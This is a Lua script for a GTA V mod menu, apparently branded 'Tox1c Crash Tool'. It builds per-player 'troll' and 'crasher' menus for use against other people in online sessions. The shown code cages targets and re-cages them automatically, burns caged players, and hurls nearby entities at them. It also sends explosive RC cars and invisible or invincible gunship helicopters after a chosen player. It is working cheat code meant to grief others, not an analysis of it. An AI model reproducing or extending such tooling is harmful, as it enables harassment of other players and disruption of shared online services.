--       /_/  /_/  /_____/  /_/ |_/   \____/   \____/   \____/            /_/|_|  /_/  /_/  /_____/  

function setup_menyoo_vehicles_list(mainroot, player, allplayers, dotp)
    for i, path in ipairs(filesystem.list_files(vehicles_dir)) do
        root = mainroot
        local ours = false
        if player == players.user() then
            ours = true 
        end
        if filesystem.is_dir(path) then
            root = menu.list(root, path:gsub(vehicles_dir, ''), {}, "")
            for i,path in ipairs(filesystem.list_files(path)) do
                if not allplayers then
                    menu.action(root, path:gsub(vehicles_dir, ''), {}, "Spawn this menyoo vehicle", function(on_click)
                        log("Click type was " .. on_click)
                        menyoo_load_vehicle(path, player, dotp, ours)
                    end)
                else
                    menu.action(root, path:gsub(vehicles_dir, ''), {}, "Spawn this menyoo vehicle for all players", function(on_click)
                        for k,v in pairs(players.list(true, true, true)) do
                            log("Click type was " .. on_click)
                            menyoo_load_vehicle(path, v, dotp, false)
                        end
                    end)
                end
            end
        else
            if string.match(path:gsub(vehicles_dir, ''), '.xml') then
                if not allplayers then
                    menu.action(root, path:gsub(vehicles_dir, ''), {}, "Spawn this menyoo vehicle", function(on_click)
                        toast("Click type was " .. on_click)
                        menyoo_load_vehicle(path, player, dotp, ours)
                    end)
                else
                    menu.action(root, path:gsub(vehicles_dir, ''), {}, "Spawn this menyoo vehicle for all players", function(on_click)
                        for k,v in pairs(players.list(true, true, true)) do
                            toast("Click type was " .. on_click)
                            menyoo_load_vehicle(path, v, dotp, false)
                        end
                    end)
                end
            end
        end
    end
end

function setup_menyoo_maps_list()
    for i, path in ipairs(filesystem.list_files(maps_dir)) do
        if filesystem.is_dir(path) then
            root = menu.list(menyoom_root, path:gsub(maps_dir, ''), {}, "")
            for i,path in ipairs(filesystem.list_files(path)) do
                menu.action(root, path:gsub(maps_dir, ''), {}, "Spawn this menyoo map", function()
                    menyoo_load_map(path)
                end)
            end
        else
            if string.match(path:gsub(maps_dir, ''), '.xml') then
                menu.action(menyoom_root, path:gsub(maps_dir, ''), {}, "Spawn this menyoo map", function()
                    menyoo_load_map(path)
                end)
            end
        end
    end
end

setup_menyoo_vehicles_list(menyoov_root, players.user(), false, true)
setup_menyoo_maps_list()

Effect = {asset = "", name = ""}
Effect.__index = Effect

function Effect.new(asset, name)
	local inst = setmetatable({}, Effect) 
	inst.name = name
	inst.asset = asset
	return inst
end

--           ____  __    _____  ____________  _____
--          / __ \/ /   /   \ \/ / ____/ __ \/ ___/
--         / /_/ / /   / /| |\  / __/ / /_/ /\__ \ 
--        / ____/ /___/ ___ |/ / /___/ _, _/___/ / 
--       /_/   /_____/_/  |_/_/_____/_/ |_|/____/  

--           ________  ___   ______________________  _   __
--          / ____/ / / / | / / ____/_  __/  _/ __ \/ | / /
--         / /_  / / / /  |/ / /     / /  / // / / /  |/ / 
--        / __/ / /_/ / /|  / /___  / / _/ // /_/ / /|  /  
--       /_/    \____/_/ |_/\____/ /_/ /___/\____/_/ |_/   

GenerateFeatures = function(pid)
    menu.divider(menu.player_root(pid), "Tox1c Crash Tool")
    local funoptions = menu.list(menu.player_root(pid), "Troll functions")
    local friendoptions = menu.list(menu.player_root(pid), "Friendly functions")
    local crashes = menu.list(menu.player_root(pid), "Crasher tools")
-------------------------------------------------
--Exclude Friends
-------------------------------------------------

local include_friends = false
menu.toggle(crashes, "Exclude friends", {}, "Safe friend ass(Off sync to friends)", function(on)
    include_friends = on
    for k, id in pairs(players.list(false, true, false)) do
        name = players.get_name(id)
        if include_friends then
            trigger_command("timeout"..name.." on")
        else
            trigger_command("timeout"..name.." off")
        end
    end
end, false)

    --local menuscrash = menu.list(crashes, "Menu Crashes/Kick")
    local sescrash = menu.list(crashes, "Crash All")
    local Teleport = menu.list(funoptions, "Teleport")
    local trolly_vehicles = menu.list(funoptions, "Trolly Vehicle")
    local cage_options = menu.list(funoptions, "Cage Options")
    local yett_options = menu.list(funoptions, "Entity YEET")
    local spawner = menu.list(funoptions, "Spawner")

----------------------------------------
--Spawner
----------------------------------------

local nhash = "name"
    menu.text_input(spawner, "Поиск хэша по названию", {"findhash"}, "", function(change)
        nhash = util.joaat(""..change.."")
        menu.trigger_commands("spawnhash"..PLAYER.GET_PLAYER_NAME(pid).. " " ..nhash.. "")
    end, ""..nhash..""
    )

    menu.text_input(spawner, "Hash", {"spawnhash"}, "", function(change)
        hash = change
    end, "0"
    )

    local godmode = false
menu.toggle(spawner, "God mode entity", {}, "Spawn in the year of fashion", function(toggle)
        tog = toggle
        if tog then
            godmode = true
        else
            godmode = false
        end
    end)

    local visible = false
    menu.toggle(spawner, "invisible entity", {}, "Spawn Invisible", function(toggle)
        tog = toggle
        if tog then
            visible = true
        else
            visible = false
        end
    end)

menu.action(spawner, "Ped", {"sped"}, "", function()
        local playerpos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
STREAMING.REQUEST_MODEL(hash)
        local ped = entities.create_ped(0, hash, playerpos, 0)
        if godmode then
            ENTITY.SET_ENTITY_CAN_BE_DAMAGED(ped, false)
        end
        if visible then
            ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
        end
    end)

menu.action(spawner, "Vehicle", {"sveh"}, "", function()
        local playerpos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
STREAMING.REQUEST_MODEL(hash)
        local vehicle = entities.create_vehicle(hash, playerpos, 0)
        if godmode then
            ENTITY.SET_ENTITY_CAN_BE_DAMAGED(vehicle, false)
        end
        if visible then
            ENTITY.SET_ENTITY_VISIBLE(vehicle, false, 0)
        end
    end)

    menu.action(spawner, "Object", {"sobject"}, "", function()
        local playerpos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        local object = entities.create_object(hash, playerpos)
        if godmode then
            ENTITY.SET_ENTITY_CAN_BE_DAMAGED(object, false)
        end
        if visible then
            ENTITY.SET_ENTITY_VISIBLE(object, false, 0)
        end
    end)
----------------------------------------
--Entity YEET
----------------------------------------

    menu.action(yett_options, 'Entity YEET', {'toxentityYeet'}, 'Pushes all peds and vehicles near them.. into them ;)\nRequires you to be near them or spectating them.', function ()
        yeetEntities(pid)
    end)

    menu.toggle_loop(yett_options, 'Entity Storm', {'toxentityStorm'}, 'Constantly pushes all peds and vehicles near them.. into them :p\nRequires you to be near them or spectating them.', function ()
        yeetEntities(pid)
        util.yield(getTotalDelay(stormDelay))
        if not players.exists(pid) then util.stop_thread() end
    end)

-- menu.slider(yett_options, "yeetRange", {"yeetRange"}, "set the max spectators for the lobby\nonly works when host", 0, 2, 2, 1, function (value)
--                 yeetRange = value
--             end)

--             menu.slider(yett_options, "yeetMultiplier", {"yeetMultiplier"}, "set the max spectators for the lobby\nonly works when host", 0, 2, 2, 1, function (value)
--                 yeetMultiplier = value
--             end)

        local strom_delay_root = menu.list(yett_options, str_trans('Storm delay') ..': '.. getDelayDisplayValue(stormDelay), {'JSentStormDelay'}, str_trans('Lets you set the delay for how often entities are pushed in entity storm.'))
        generateDelaySettings(strom_delay_root, str_trans('Storm delay'), stormDelay)


----------------------------------------
--Cages
----------------------------------------

	cage = joaat("prop_gascage01")	
	ladder = 1888301071
	ground = -1951226014
	attach = 1
	veh_to_attach = 1

    menu.action(cage_options, "Simple", {"cage"}, "", function()
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(player_ped) 
		if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
			trigger_command("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
			wait(300)
			if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
				toast("Failed to kick player out of the vehicle", red)
				trigger_command("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
				return
			end
			trigger_command("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
			pos =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) --if not it could place the cage at the wrong position
		end
		cage_player(pos)
	end)

---------------------------------------------------------------------------------------------------------------------------------
	
	menu.action(cage_options, "First Job", {"foodtruckcage"}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		local hash = 4022605402
		STREAMING.REQUEST_MODEL(hash)
		while not STREAMING.HAS_MODEL_LOADED(hash) do		
			wait()
		end
		local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
		cages[#cages + 1] = cage_object
		wait(15)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
	end)

---------------------------------------------------------------------------------------------------------------------------------
	
    menu.action(cage_options, "Married Simulator", {"doghousecage"}, "", function()
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        local hash = -1782242710
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do		
            wait()
        end
        local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
        cages[#cages + 1] = cage_object
        wait(15)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
    end)

---------------------------------------------------------------------------------------------------------------------------------
	
    menu.action(cage_options, "Christmas Time", {"jollycage"}, "", function()
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        local hash = 238789712
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do		
            wait()
        end
        local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
        cages[#cages + 1] = cage_object
        wait(15)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
    end)

---------------------------------------------------------------------------------------------------------------------------------
	
    menu.action(cage_options, "Christmas Time v2", {"jollycage2"}, "", function()
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        local hash = joaat("ch_prop_tree_02a")
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do		
            wait()
        end
        local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
        local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
        local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
        local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
        local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
        cages[#cages + 1] = cage_object
        cages[#cages + 1] = cage_object2
        cages[#cages + 1] = cage_object3
        cages[#cages + 1] = cage_object4
        cages[#cages + 1] = cage_object5
        wait(15)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
    end)

---------------------------------------------------------------------------------------------------------------------------------

    menu.action(cage_options, "Christmas Time v3", {"jollycage3"}, "", function()
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        local hash = joaat("ch_prop_tree_03a")
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do		
            wait()
        end
        local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .75, pos.y, pos.z - .5, true, true, false) -- front
        local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .75, pos.y, pos.z - .5, true, true, false) -- back
        local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .75, pos.z - .5, true, true, false) -- left
        local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .75, pos.z - .5, true, true, false) -- right
        local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .5, true, true, false) -- above
        cages[#cages + 1] = cage_object
        cages[#cages + 1] = cage_object2
        cages[#cages + 1] = cage_object3
        cages[#cages + 1] = cage_object4
        cages[#cages + 1] = cage_object5
        wait()
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
    end)

---------------------------------------------------------------------------------------------------------------------------------
	
    menu.action(cage_options, "'Safe' Space", {"safecage"}, "", function()
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        local hash = 1089807209
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do		
            wait()
        end
        local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - 1, pos.y, pos.z - .5, true, true, false) -- front
        local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + 1, pos.y, pos.z - .5, true, true, false) -- back
        local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + 1, pos.z - .5, true, true, false) -- left
        local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - 1, pos.z - .5, true, true, false) -- right
        local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
        cages[#cages + 1] = cage_object
        cages[#cages + 1] = cage_object2
        cages[#cages + 1] = cage_object3
        cages[#cages + 1] = cage_object4
        cages[#cages + 1] = cage_object5

        ENTITY.FREEZE_ENTITY_POSITION(cage_object, true)
        ENTITY.FREEZE_ENTITY_POSITION(cage_object2, true)
        ENTITY.FREEZE_ENTITY_POSITION(cage_object3, true)
        ENTITY.FREEZE_ENTITY_POSITION(cage_object4, true)
        ENTITY.FREEZE_ENTITY_POSITION(cage_object5, true)
        wait(15)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
    end)

---------------------------------------------------------------------------------------------------------------------------------

    menu.action(cage_options, "Average X-Force User", {"trashcage"}, "", function()
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        local hash = 684586828
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do		
            wait()
        end
        local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1, true, true, false)
        local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z, true, true, false)
        local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + 1, true, true, false)
        cages[#cages + 1] = cage_object
        cages[#cages + 1] = cage_object2
        cages[#cages + 1] = cage_object3
        wait(15)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
    end)

---------------------------------------------------------------------------------------------------------------------------------

    menu.action(cage_options, "Money Cage", {"moneycage"}, "", function()
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        local hash = joaat("bkr_prop_moneypack_03a")
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do		
            wait()
        end
        local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z, true, true, false) -- front
        local cage_object2 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z, true, true, false) -- back
        local cage_object3 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z, true, true, false) -- left
        local cage_object4 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z, true, true, false) -- right
        local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x - .70, pos.y, pos.z + .25, true, true, false) -- front
        local cage_object6 = OBJECT.CREATE_OBJECT(hash, pos.x + .70, pos.y, pos.z + .25, true, true, false) -- back
        local cage_object7 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y + .70, pos.z + .25, true, true, false) -- left
        local cage_object8 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y - .70, pos.z + .25, true, true, false) -- right
        local cage_object9 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
        cages[#cages + 1] = cage_object
        cages[#cages + 1] = cage_object2
        cages[#cages + 1] = cage_object3
        cages[#cages + 1] = cage_object4
        cages[#cages + 1] = cage_object5
        cages[#cages + 1] = cage_object6
        cages[#cages + 1] = cage_object7
        cages[#cages + 1] = cage_object8
        cages[#cages + 1] = cage_object9
        wait(15)
        local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
        rot.y = 90
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
    end)

----------------------------------------------------------------------------------------------------------------------------------

	menu.action(cage_options, "Stunt Tube", {"stuntcage"}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		STREAMING.REQUEST_MODEL(2081936690)
		while not STREAMING.HAS_MODEL_LOADED(2081936690) do		
			wait()
		end
		local cage_object = OBJECT.CREATE_OBJECT(2081936690, pos.x, pos.y, pos.z, true, true, false)
		cages[#cages + 1] = cage_object
		wait(15)
		local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
		rot.y = 90
		ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
	end)
							
	local cage_loop = false
	menu.toggle(cage_options, "Atomatic", {"autocage"}, "Cage them in a trap. If they get out... Do it again. No, I'll do it for you actually", function(on)
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local a = ENTITY.GET_ENTITY_COORDS(player_ped) --first position
		cage_loop = on
		if cage_loop then
			if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
				trigger_command("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")
				wait(300)
				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
					toast("Failed to kick player out of the vehicle", red)
					trigger_command("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
					return
				end
				trigger_command("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")
				a =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
			end
			cage_player(a)
		end
		while cage_loop do
			local b = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) --current position
			local ba = {x = b.x - a.x, y = b.y - a.y, z = b.z - a.z} 
			if math.sqrt(ba.x * ba.x + ba.y * ba.y + ba.z * ba.z) >= 4 then --now I know there's a native to find distance between coords but I like this >_<
				a = b
				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
					goto continue
				end
				cage_player(a)
				toast(PLAYER.GET_PLAYER_NAME(pid).." was out of the cage. Doing it again", black)
				::continue::
			end
			wait(1000)
		end
	end)
	
    menu.action(cage_options, "Slowly Burn Them To Death", {}, "use this to slowly kill the poor caged person (ONLY WORKS WITH SOME CAGES)", function()
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        local hash = joaat("prop_beach_fire")
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do
            STREAMING.REQUEST_MODEL(hash)	
            wait()
        end
        local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1.75, true, true, false) -- front
        cages[#cages + 1] = cage_object
        local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
        rot.y = 90
    end)

    menu.action(cage_options, "Release Player", {"release"}, "Attempts to delete spawned cages, for more complicated traps it will delete one side.", function() -- ez fix but lazy
        for key, value in pairs(cages) do
            entities.delete_by_handle(value)
        end
    end)

----------------------------------------
--GO BANDITO
----------------------------------------

    local banditos = {
        godmode = false, 
        explosive_bandito_exists = false
    }

    menu.divider(trolly_vehicles, "Bandito")
    menu.click_slider(trolly_vehicles, menuname("Trolling - Trolly Vehicles", "Send Bandito(s)"), {"sendbandito"}, "", 1,25,1,1, function(quantity)
        local vehicleHash = joaat("rcbandito")
        local pedHash = joaat("mp_m_freemode_01")
        requestModels(vehicleHash, pedHash)
        for i = 1, quantity do
            local vehicle, driver = spawn_trolly_vehicle(pid, vehicleHash, pedHash)
            addBlipForEntity(vehicle, 646, 4)
            ENTITY.SET_ENTITY_INVINCIBLE(vehicle, banditos.godmode)
            ENTITY.SET_ENTITY_VISIBLE(driver, false, 0)
            wait(150)
        end
    end)

    menu.toggle(trolly_vehicles, menuname("Trolling - Trolly Vehicles", "Invincible"), {}, "", function(toggle)
        banditos.godmode = toggle
    end)

    menu.action(trolly_vehicles, menuname("Trolling - Trolly Vehicles", "Send Explosive Bandito"), {"explobandito"}, "", function()
        local vehicleHash = joaat("rcbandito")
        local pedHash = joaat("mp_m_freemode_01")
        requestModels(vehicleHash, pedHash)
        
        if banditos.explosive_bandito_exists then
            toast("Can't spawn more than 1 car")
            return
        end
        banditos.explosive_bandito_exists = true
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local bandito = spawn_trolly_vehicle(pid, vehicleHash, pedHash)
        VEHICLE.SET_VEHICLE_MOD(bandito, 5, 3, false)
        VEHICLE.SET_VEHICLE_MOD(bandito, 48, 5, false)
        VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(bandito, 128, 0, 128)
        VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(bandito, 128, 0, 128)
        addBlipForEntity(bandito, 646, 27)
        VEHICLE.ADD_VEHICLE_PHONE_EXPLOSIVE_DEVICE(bandito)

        while not ENTITY.IS_ENTITY_DEAD(bandito) do
            wait()
            local a = ENTITY.GET_ENTITY_COORDS(p)
            local b = ENTITY.GET_ENTITY_COORDS(bandito)
            if vect.dist2(a,b) < 9.0 then
                VEHICLE.DETONATE_VEHICLE_PHONE_EXPLOSIVE_DEVICE()
            end
        end

        banditos.explosive_bandito_exists = false
    end)

    menu.action(trolly_vehicles, menuname("Trolling - Trolly Vehicles", "Delete Bandito(s)"), {}, "", function()
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), false)
        deleteNearbyVehicles(pos, "rcbandito", 1000.0)
    end)

-------------------------------------
--GO KART
-------------------------------------

    local gokartGodmode = false
    menu.divider(trolly_vehicles, "Go-Kart")

    menu.click_slider(trolly_vehicles, menuname("Trolling - Trolly Vehicles", "Send Go-Kart(s)"), {"sendgokart"}, "",1, 15, 1, 1, function(quantity)
        local vehicleHash = joaat("veto2")
        local pedHash = joaat("mp_m_freemode_01")
        requestModels(vehicleHash, pedHash)
        
        for i = 1, quantity do
            local gokart, driver = spawn_trolly_vehicle(pid, vehicleHash, pedHash)
            addBlipForEntity(gokart, 748, 5)
            ENTITY.SET_ENTITY_INVINCIBLE(gokart, gokartGodmode)
            VEHICLE.SET_VEHICLE_COLOURS(gokart, 89, 0)
            VEHICLE.TOGGLE_VEHICLE_MOD(gokart, 18, true)
            ENTITY.SET_ENTITY_INVINCIBLE(driver, gokartGodmode)
            PED.SET_PED_COMPONENT_VARIATION(driver, 3, 111, 13, 2)
            PED.SET_PED_COMPONENT_VARIATION(driver, 4, 67, 5, 2)
            PED.SET_PED_COMPONENT_VARIATION(driver, 6, 101, 1, 2)
            PED.SET_PED_COMPONENT_VARIATION(driver, 8, -1, -1, 2)
            PED.SET_PED_COMPONENT_VARIATION(driver, 11, 148, 5, 2)
            PED.SET_PED_PROP_INDEX(driver, 0, 91, 0, true)
            wait(150)
        end

    end)

    menu.toggle(trolly_vehicles, menuname("Trolling - Trolly Vehicles", "Invincible"), {}, "", function(toggle)
        gokartGodmode = toggle
    end)

    menu.action(trolly_vehicles, menuname("Trolling - Trolly Vehicles", "Delete Go-Karts"), {}, "", function()
        local pos = getEntityCoords(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), false)
        deleteNearbyVehicles(pos, "veto2", 1000.0)
    end)

-------------------------------------
	-- ENEMY BUZZARD
-------------------------------------

	local buzzard = {
		visible = true,
		godmode = false,
		gunnerWeapon = "weapon_mg",
        entity = {
            helis = {},
            peds = {}
        }
	}
	
	menu.divider(trolly_vehicles, menuname("Trolling - Enemy Vehicles", "Buzzard"))
	menu.click_slider(trolly_vehicles, menuname("Trolling - Enemy Vehicles", "Send Buzzard(s)"), {"sendbuzzard"}, "", 1, 5, 1, 1, function(quantity)
		local vehicleHash = util.joaat("buzzard2")
		local pedHash = util.joaat("s_m_y_blackops_01")
		local targetPed =  PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local pos = ENTITY.GET_ENTITY_COORDS(targetPed)
		local playerGroupHash = PED.GET_PED_RELATIONSHIP_GROUP_HASH(targetPed)

		requestModels(pedHash, vehicleHash)		
		PED.SET_RELATIONSHIP_BETWEEN_GROUPS(5, util.joaat("ARMY"), playerGroupHash)
		PED.SET_RELATIONSHIP_BETWEEN_GROUPS(5, playerGroupHash, util.joaat("ARMY"))
		PED.SET_RELATIONSHIP_BETWEEN_GROUPS(0, util.joaat("ARMY"), util.joaat("ARMY"))

		for i = 1, quantity do
			local heli = VEHICLE.CREATE_VEHICLE(vehicleHash, pos.x, pos.y, pos.z, CAM.GET_GAMEPLAY_CAM_ROT(0).z, true, false)
			NETWORK.SET_NETWORK_ID_CAN_MIGRATE(NETWORK.VEH_TO_NET(heli), false)

			if ENTITY.DOES_ENTITY_EXIST(heli) then
				local pilot = entities.create_ped(29, pedHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
				PED.SET_PED_INTO_VEHICLE(pilot, heli, -1)

				pos.x = pos.x + math.random(-20,20)
				pos.y = pos.y + math.random(-20,20)
				pos.z = pos.z + 30
				
				ENTITY.SET_ENTITY_COORDS(heli, pos.x, pos.y, pos.z)
				NETWORK.SET_NETWORK_ID_CAN_MIGRATE(NETWORK.VEH_TO_NET(heli), false)
				ENTITY.SET_ENTITY_INVINCIBLE(heli, buzzard.godmode)
				ENTITY.SET_ENTITY_VISIBLE(heli, buzzard.visible, 0)	
				VEHICLE.SET_VEHICLE_ENGINE_ON(heli, true, true, true)
				VEHICLE.SET_HELI_BLADES_FULL_SPEED(heli)
				addBlipForEntity(heli, 422, 4)

				PED.SET_PED_MAX_HEALTH(pilot, 500)
				ENTITY.SET_ENTITY_HEALTH(pilot, 500)
				ENTITY.SET_ENTITY_INVINCIBLE(pilot, buzzard.godmode)
				ENTITY.SET_ENTITY_VISIBLE(pilot, buzzard.visible, 0)
				PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(pilot, true)
				TASK.TASK_HELI_MISSION(pilot, heli, 0, targetPed, 0.0, 0.0, 0.0, 23, 40.0, 40.0, -1.0, 0, 10, -1.0, 0)
				PED.SET_PED_KEEP_TASK(pilot, true)

                buzzard.entity.peds[#buzzard.entity.peds + 1] = pilot	
				for seat = 1, 2 do 
					local ped = entities.create_ped(29, pedHash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
					PED.SET_PED_INTO_VEHICLE(ped, heli, seat)
					WEAPON.GIVE_WEAPON_TO_PED(ped, util.joaat(buzzard.gunnerWeapon), -1, false, true)
					PED.SET_PED_COMBAT_ATTRIBUTES(ped, 20, true)
					PED.SET_PED_MAX_HEALTH(ped, 500)
					ENTITY.SET_ENTITY_HEALTH(ped, 500)
					ENTITY.SET_ENTITY_INVINCIBLE(ped, buzzard.godmode)
					ENTITY.SET_ENTITY_VISIBLE(ped, buzzard.visible, 0)
					PED.SET_PED_SHOOT_RATE(ped, 1000)
					PED.SET_PED_RELATIONSHIP_GROUP_HASH(ped, util.joaat("ARMY"))
					TASK.TASK_COMBAT_HATED_TARGETS_AROUND_PED(ped, 1000, 0)
                    buzzard.entity.peds[#buzzard.entity.peds + 1] = ped
				end
				wait(100)
			end
           buzzard.entity.helis[#buzzard.entity.helis + 1] = heli
		end
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehicleHash)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash)
	end)
	
	menu.toggle(trolly_vehicles, menuname("Trolling - Enemy Vehicles", "Invincible"), {}, "", function(toggle)
		buzzard.godmode = toggle
	end)

	local gunnerWeaponList = menu.list(trolly_vehicles, menuname("Trolling - Enemy Vehicles", "Gunners Weapon") .. ": " .. HUD._GET_LABEL_TEXT("WT_MG"))
	menu.divider(gunnerWeaponList, HUD._GET_LABEL_TEXT("PM_WEAPONS"))

	-- these are the buzzard's gunner weapons
	local gunnerWeapons = {
		WT_MG 	= "weapon_mg",
		WT_RPG 	= "weapon_rpg",
		WT_RAILGUN 	= "weapon_railgun"
	}

	for label, weapon in pairsByKeys(gunnerWeapons) do
		local strg = HUD._GET_LABEL_TEXT(label)
		menu.action(gunnerWeaponList, strg, {}, "", function()
			buzzard.gunnerWeapon = weapon
			menu.set_menu_name(gunnerWeaponList, "Gunner's Weapon: " .. strg)
			menu.focus(gunnerWeaponList)
		end)
	end

	menu.toggle(trolly_vehicles, menuname("Trolling - Enemy Vehicles", "Visible"), {}, "You shouldn't be that toxic to turn this off.", function(toggle)
		buzzard.visible = toggle
	end, true)

    menu.action(trolly_vehicles, "Delete Buzzard", {}, "", function()
        for group, value in pairs(buzzard.entity) do
            for _, ent in pairs(value) do
                entities.delete_by_handle(ent)
            end    
        end
    end)

--------------------------------------------
--Troll Options
--------------------------------------------

	local forcefieldOpt = {"Disable", "Push Out", "Destroy"}
	local currentForcefield
